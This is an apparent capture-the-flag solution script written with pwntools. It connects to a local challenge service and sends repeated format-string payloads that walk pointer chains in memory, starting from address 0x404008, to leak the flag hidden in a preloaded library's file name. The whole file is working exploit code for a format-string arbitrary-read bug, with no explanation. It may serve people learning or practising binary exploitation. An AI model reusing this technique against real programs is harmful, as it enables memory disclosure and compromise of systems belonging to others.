from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process('./chal', env={'LD_PRELOAD': './THJCC{Th1s_fl4G_i5n\'7_fr3E,_bU7_It\'s_f0r_You!!!}.so'})
r = remote('127.0.0.1', 30001)


payload1 = b'%p' * 12 + b',' + b'%s'
payload1 = payload1.ljust(0x20, b'.') + p64(0x404008)
r.sendlineafter(b'> ', b'a')
r.sendlineafter(b'> ', b'a')
r.sendlineafter(b'> ', payload1)
r.recvuntil(b',')
addr1 = u64(r.recv(6).ljust(8, b'\0'))
r.sendlineafter(b'] ', b'n')


payload2 = b'%p' * 12 + b',' + b'%s'
payload2 = payload2.ljust(0x20, b'.') + p64(addr1 + 0x18)
r.sendlineafter(b'> ', b'a')
r.sendlineafter(b'> ', b'a')
r.sendlineafter(b'> ', payload2)
r.recvuntil(b',')
addr2 = u64(r.recv(6).ljust(8, b'\0'))
r.sendlineafter(b'] ', b'n')


payload3 = b'%p' * 12 + b',' + b'%s'
payload3 = payload3.ljust(0x20, b'.') + p64(addr2 + 0x18)
r.sendlineafter(b'> ', b'a')
r.sendlineafter(b'> ', b'a')
r.sendlineafter(b'> ', payload3)
r.recvuntil(b',')
addr3 = u64(r.recv(6).ljust(8, b'\0'))
r.sendlineafter(b'] ', b'n')


payload4 = b'%p' * 12 + b',' + b'%s'
payload4 = payload4.ljust(0x20, b'.') + p64(addr3 + 0x8)
r.sendlineafter(b'> ', b'a')
r.sendlineafter(b'> ', b'a')
r.sendlineafter(b'> ', payload4)
r.recvuntil(b',')
addr4 = u64(r.recv(6).ljust(8, b'\0'))
r.sendlineafter(b'] ', b'n')
info(f'flag addr : {hex(addr4)}')


payload5 = b'%p' * 12 + b',' + b'%s'
payload5 = payload5.ljust(0x20, b'.') + p64(addr4)
r.sendlineafter(b'> ', b'a')
r.sendlineafter(b'> ', b'a')
r.sendlineafter(b'> ', payload5)
r.recvuntil(b',')

print(r.recvuntil(b'.so'))

r.close()